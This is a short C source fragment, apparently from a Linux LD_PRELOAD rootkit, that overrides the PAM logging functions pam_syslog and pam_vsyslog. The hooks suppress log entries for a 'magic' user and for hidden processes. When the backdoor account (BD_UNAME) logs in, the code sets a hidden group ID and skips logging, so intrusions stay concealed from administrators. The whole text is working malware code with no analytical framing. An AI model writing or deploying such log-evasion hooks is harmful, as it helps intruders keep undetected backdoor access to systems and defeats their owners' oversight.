void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
    if(magicusr() || hidden_ppid()) return;

    va_list va;

    char *user = get_username(pamh);
    if(user == NULL) goto end_pam_syslog;

    if(!strcmp(user, BD_UNAME)){
        hook(CSETGID);
        call(CSETGID, readgid());
        return;
    }

end_pam_syslog:
    va_start(va, fmt);
    pam_vsyslog(pamh, priority, fmt, va);
    va_end(va);
}

void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args){
    if(magicusr() || hidden_ppid()) return;

    char *user = get_username(pamh);
    if(user == NULL) goto end_pam_vsyslog;    

    if(!strcmp(user, BD_UNAME)){
        hook(CSETGID);
        call(CSETGID, readgid());
        return;
    }

end_pam_vsyslog:
    hook(CPAM_VSYSLOG);
    call(CPAM_VSYSLOG, pamh, priority, fmt, args);
}